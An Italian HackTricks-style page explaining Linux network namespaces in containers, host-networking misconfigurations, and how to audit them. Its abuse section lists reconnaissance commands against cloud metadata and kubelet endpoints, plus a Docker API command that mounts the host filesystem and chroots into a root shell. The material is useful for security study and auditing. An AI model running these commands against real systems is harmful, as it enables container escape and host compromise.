# Namespace di rete

{{#include ../../../../../banners/hacktricks-training.md}}

## Panoramica

Il namespace di rete isola risorse relative alla rete come interfacce, indirizzi IP, tabelle di routing, stato ARP/neighbor, regole del firewall, socket e il contenuto di file come `/proc/net`. Per questo un container può avere quello che sembra il proprio `eth0`, le proprie rotte locali e il proprio dispositivo loopback senza possedere lo stack di rete reale dell'host.

Dal punto di vista della sicurezza, questo è importante perché l'isolamento di rete riguarda molto più del port binding. Un namespace di rete privato limita ciò che il workload può osservare o riconfigurare direttamente. Una volta che quel namespace viene condiviso con l'host, il container può improvvisamente ottenere visibilità sui listener dell'host, sui servizi locali dell'host e sui punti di controllo della rete che non erano mai destinati a essere esposti all'applicazione.

## Funzionamento

Un namespace di rete appena creato inizia con un ambiente di rete vuoto o quasi vuoto finché non gli vengono collegate delle interfacce. I runtime dei container poi creano o connettono interfacce virtuali, assegnano indirizzi e configurano rotte in modo che il workload abbia la connettività prevista. Nelle distribuzioni basate su bridge, questo di solito significa che il container vede un'interfaccia veth-backed collegata a un bridge dell'host. In Kubernetes, i plugin CNI gestiscono la configurazione equivalente per il networking dei Pod.

Questa architettura spiega perché `--network=host` o `hostNetwork: true` rappresentano un cambiamento così drastico. Invece di ricevere uno stack di rete privato preconfigurato, il workload si unisce allo stack reale dell'host.

## Lab

Puoi vedere un namespace di rete quasi vuoto con:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
E puoi confrontare i container normali e quelli con rete host con:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Il container in host-networking non ha più la propria vista isolata di socket e interfacce. Questo cambiamento da solo è già significativo prima ancora di chiedersi quali capabilities abbia il processo.

## Utilizzo a runtime

Docker e Podman creano normalmente un namespace di rete privato per ogni container a meno che non siano configurati diversamente. Kubernetes di solito assegna a ogni Pod il proprio namespace di rete, condiviso tra i container all'interno di quel Pod ma separato dall'host. I sistemi Incus/LXC offrono anch'essi un isolamento basato su namespace di rete molto ricco, spesso con una più ampia varietà di configurazioni di networking virtuale.

Il principio comune è che il networking privato è il confine di isolamento predefinito, mentre l'host networking è una scelta esplicita per uscire da quel confine.

## Errori di configurazione

La misconfigurazione più importante è semplicemente la condivisione del namespace di rete dell'host. Questo viene talvolta fatto per prestazioni, monitoring a basso livello o comodità, ma rimuove uno dei confini più netti disponibili per i container. I listener locali dell'host diventano raggiungibili in modo più diretto, i servizi localhost-only possono diventare accessibili, e capability come `CAP_NET_ADMIN` o `CAP_NET_RAW` diventano molto più pericolose perché le operazioni che abilitano vengono ora applicate all'ambiente di rete dell'host stesso.

Un altro problema è il concedere eccessive network-related capabilities anche quando il namespace di rete è privato. Un namespace privato aiuta, ma non rende innocui i raw sockets o il controllo avanzato della rete.

## Abuso

In setup con isolamento debole, un attacker può ispezionare i servizi in ascolto dell'host, raggiungere management endpoint legati solo a loopback, sniffare o interferire con il traffico a seconda delle capability e dell'ambiente, o riconfigurare lo stato di routing e firewall se è presente `CAP_NET_ADMIN`. In un cluster, questo può anche facilitare lateral movement e il controllo e la ricognizione del control-plane.

Se sospetti host networking, inizia confermando che le interfacce e i listener visibili appartengano all'host piuttosto che a una rete isolata del container:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
I servizi accessibili solo tramite loopback sono spesso la prima scoperta interessante:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Se sono presenti capability di rete, verifica se il workload può ispezionare o alterare lo stack visibile:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Negli ambienti cluster o cloud, il networking dell'host giustifica anche una rapida ricognizione locale di metadati e servizi adiacenti al control-plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Esempio completo: Host Networking + Local Runtime / Kubelet Access

Host networking non fornisce automaticamente l'accesso root dell'host, ma spesso espone servizi che sono intenzionalmente raggiungibili solo dal nodo stesso. Se uno di questi servizi è debolmente protetto, Host networking diventa un percorso diretto di privilege-escalation.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet su localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impatto:

- compromissione diretta dell'host se un'API di runtime locale è esposta senza adeguata protezione
- cluster reconnaissance or lateral movement se kubelet o local agents sono raggiungibili
- manipolazione del traffico o denial of service quando combinato con `CAP_NET_ADMIN`

## Verifiche

L'obiettivo di queste verifiche è capire se il processo ha uno stack di rete privato, quali rotte e listener sono visibili, e se la vista di rete appare già simile a quella dell'host prima ancora di testare le capabilities.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Cosa c'è di interessante qui:

- Se l'identificatore del namespace o l'insieme delle interfacce visibili somiglia a quello dell'host, il networking dell'host potrebbe essere già in uso.
- `ss -lntup` è particolarmente prezioso perché mostra i processi in ascolto solo su loopback e gli endpoint di gestione locali.
- Rotte, nomi delle interfacce e il contesto del firewall diventano molto più importanti se è presente `CAP_NET_ADMIN` o `CAP_NET_RAW`.

Quando si esamina un container, valuta sempre il network namespace insieme al set di capability. Il networking dell'host abbinato a capability di rete elevate rappresenta una postura molto diversa rispetto al networking tramite bridge con un set di capability predefinito e ristretto.
{{#include ../../../../../banners/hacktricks-training.md}}
